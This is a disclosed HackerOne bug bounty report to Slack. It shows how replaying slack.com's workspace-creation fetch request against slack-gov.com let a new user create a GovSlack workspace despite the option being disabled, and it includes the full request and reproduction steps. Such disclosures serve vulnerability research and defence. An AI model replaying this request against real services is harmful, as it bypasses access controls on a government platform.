# Unauthorized access to GovSlack

## Report Details
- **Report ID**: 1758174
- **URL**: https://hackerone.com/reports/1758174
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-11-02T02:19:40.145Z
- **Disclosed**: 2023-05-19T20:29:25.445Z

## Reporter
- **Username**: violet
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
Head to slack.com (I use firefox), login as a user that hasn't used slack, create a workspace, copy the payload as fetch.  In my case:

```
await fetch("https://slack.com/api/signup.createTeam?_x_id=noversion-1667355054.372", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------34111059701841183173198228768",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    "referrer": "https://slack.com/get-started",
    "body": "-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n",
    "method": "POST",
    "mode": "cors"
});
```

Login to slack-gov.com, where the option to create a workspace for new users is disabled.  Send this same fetch request, replacing slack.com with slack-gov.com.  In my case, the workspace created is viomck.slack-gov.com.

## Impact

Unauthorized access to GovSlack.

## Attachments
No attachments
